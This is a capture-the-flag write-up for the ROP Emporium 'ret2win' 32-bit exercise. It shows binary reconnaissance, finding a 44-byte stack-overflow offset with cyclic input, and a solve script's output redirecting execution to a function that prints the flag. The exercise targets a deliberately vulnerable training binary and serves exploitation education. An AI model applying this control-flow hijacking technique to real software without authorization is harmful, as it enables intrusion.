# ret2win | ROP Emporium

```bash
kali@kali:~/Desktop/rop$ file ret2win32 
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped

kali@kali:~/Desktop/rop$ checksec --file=ret2win32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72) Symbols       No    0               3               ret2win32
```

## Steps
### 1. Investigate binary
Function names and symbol names:
```bash
kali@kali:~/Desktop/rop$ rabin2 -i ret2win32 
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080483b0 GLOBAL FUNC       read
2   0x080483c0 GLOBAL FUNC       printf
3   0x080483d0 GLOBAL FUNC       puts
4   0x080483e0 GLOBAL FUNC       system
5   0x00000000 WEAK   NOTYPE     __gmon_start__
6   0x080483f0 GLOBAL FUNC       __libc_start_main
7   0x08048400 GLOBAL FUNC       setvbuf
8   0x08048410 GLOBAL FUNC       memset

kali@kali:~/Desktop/rop$ nm -u ret2win32 
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U memset@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U setvbuf@@GLIBC_2.0
         U system@@GLIBC_2.0
```
Attempt to show just functions written by the programmer of the binary:
```bash
kali@kali:~/Desktop/rop$ rabin2 -qs ret2win32 | grep -ve imp -e ' 0 '
0x0804a030 4 stdout
0x080486dc 4 _IO_stdin_used
0x0804a034 1 completed.7283
0x080485ad 127 pwnme
0x0804862c 41 ret2win
0x080486c0 2 __libc_csu_fini
0x08048480 4 __x86.get_pc_thunk.bx
0x08048660 93 __libc_csu_init
0x08048470 2 _dl_relocate_static_pie
0x080486d8 4 _fp_hw
0x0804a030 4 stdout@@GLIBC_2.0
0x08048546 103 main
```
Can see there is main, ret2win and pwnme that stand out as functions probably written by the programmer.  
Strings in the binary:
```bash
ali@kali:~/Desktop/rop$ rabin2 -z ret2win32 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006e0 0x080486e0 23  24   .rodata ascii ret2win by ROP Emporium
1   0x000006f8 0x080486f8 4   5    .rodata ascii x86\n
2   0x000006fd 0x080486fd 8   9    .rodata ascii \nExiting
3   0x00000708 0x08048708 95  96   .rodata ascii For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
4   0x00000768 0x08048768 29  30   .rodata ascii What could possibly go wrong?
5   0x00000788 0x08048788 95  96   .rodata ascii You there, may I have your input please? And don't worry about null bytes, we're using read()!\n
6   0x000007eb 0x080487eb 10  11   .rodata ascii Thank you!
7   0x000007f6 0x080487f6 28  29   .rodata ascii Well done! Here's your flag:
8   0x00000813 0x08048813 17  18   .rodata ascii /bin/cat flag.txt
```
When looking at the ret2win function in radare2, it can be seen the flag.txt file is read using cat.
```bash
[0x08048430]> pdf @sym.ret2win
┌ 41: sym.ret2win ();
│           0x0804862c      55             push ebp
│           0x0804862d      89e5           mov ebp, esp
│           0x0804862f      83ec08         sub esp, 8
│           0x08048632      83ec0c         sub esp, 0xc
│           0x08048635      68f6870408     push str.Well_done__Here_s_your_flag: ; 0x80487f6 ; "Well done! Here's your flag:" ; const char *s
│           0x0804863a      e891fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804863f      83c410         add esp, 0x10
│           0x08048642      83ec0c         sub esp, 0xc
│           0x08048645      6813880408     push str.bin_cat_flag.txt   ; 0x8048813 ; "/bin/cat flag.txt" ; const char *string
│           0x0804864a      e891fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0804864f      83c410         add esp, 0x10
│           0x08048652      90             nop
│           0x08048653      c9             leave
└           0x08048654      c3             ret
[0x08048430]> 
```
This is the funcion that needs to be reached.

### 2. Figure out the payload
First find the offset at which to place the payload. I'm just going to fill the 56 byte stack buffer with cyclic input and then retrieve the segfault message.
```bash
kali@kali:~/Desktop/rop$ sudo dmesg -C
kali@kali:~/Desktop/rop$ python -c "from pwn import cyclic; print(cyclic(56))" | ./ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Segmentation fault
kali@kali:~/Desktop/rop$ sudo dmesg -t
ret2win32[3721]: segfault at 6161616c ip 000000006161616c sp 00000000fff8ee80 error 14 in libc-2.30.so[f7ce5000+1d000]
Code: Bad RIP value.
kali@kali:~/Desktop/rop$ python -c "from pwn import cyclic_find; print(cyclic_find(0x6161616c))"
44
```
With the offset known, I can now construct an exploit to jump to the desired function (see solve.py).

### 3. Run against the binary to win
```bash
kali@kali:~/Desktop/rop$ python solve.py 
[*] '/home/kali/Desktop/rop/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/kali/Desktop/rop/ret2win32': pid 2621
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/home/kali/Desktop/rop/ret2win32' (pid 2621)
```

## Differences in architecture
I also did the x64 binary, which is the same process except the offset is 4 bytes less with a longer (64 bit) ret2win address.
